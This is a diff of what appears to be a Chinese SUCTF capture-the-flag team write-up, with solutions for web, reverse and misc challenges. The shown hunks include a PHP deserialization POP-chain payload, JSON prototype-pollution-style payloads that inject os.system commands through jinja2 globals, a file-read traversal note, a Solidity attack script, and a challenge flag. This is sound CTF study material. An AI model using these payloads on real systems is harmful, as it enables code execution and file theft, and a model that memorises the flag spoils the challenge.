@@ -7,7 +7,7 @@
 
 admin@chamd5.org(带上简历和想加入的小组)
 
-Web: 
+Web:
 
 SU_POP
 
@@ -107,7 +107,7 @@ $pop->reason=new ConstTypeNode();  
 $pop->reason->constExpr=new Table();  
 echo base64_encode(serialize($pop));
 
- SU_blog 
+ SU_blog
 
 登陆后发现有file参数，可以实现目录穿越读取任意文件，绕过一下../，获得源码
 
@@ -121,7 +121,7 @@ echo base64_encode(serialize($pop));
 
 最后成功命令执行，这里编译包是只有第一次渲染时才会调用的，所以选择 2 分钟的容器并且多访问几个页面。最后获得flag
 
- Reverse: 
+ Reverse:
 
 SU_BBRE
 
@@ -139,7 +139,7 @@ for i in range(len(data)):
 拼接起来即可：
 SUCTF{We1com3ToReWorld="@AndPWNT00}
 
- Misc: 
+ Misc:
 
 Onchain Magician
 
@@ -358,32 +358,12 @@ $pop = new RejectedPromise();  
 $pop->reason=new ConstTypeNode();  
 $pop->reason->constExpr=new Table();  
 echo base64_encode(serialize($pop));
-```
-
-
-
-```
 {"name":"__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0","value":"*;import os;os.system('id')"}
-```
-
-
-
-```
 {"key": ".__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]","value": "*;import os;os.system('/read* >/tmp/gaoren.txt')"}
-```
-
-
-
-```
 data=[0x41,0x6D,0x62,0x4D,0x53,0x49,0x4E,0x29,0x28]
 for i in range(len(data)):
     print(chr(data[i]+i),end='')
 #AndPWNT00
-```
-
-
-
-```
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity 0.8.28;
 
@@ -430,11 +410,6 @@ contract MagicBox {
  isOpened = true;
  }
 }
-```
-
-
-
-```
 import {Script, console2} from "forge-std/Script.sol";
 import {MagicBox} from "../src/MagicBox.sol";
 
@@ -460,11 +435,6 @@ contract Attack is Script {
  vm.stopBroadcast();
  }
 }
-```
-
-
-
-```
 🐍☂️🐈🌮🍟分别对应以下：
 snake
 umbrellla
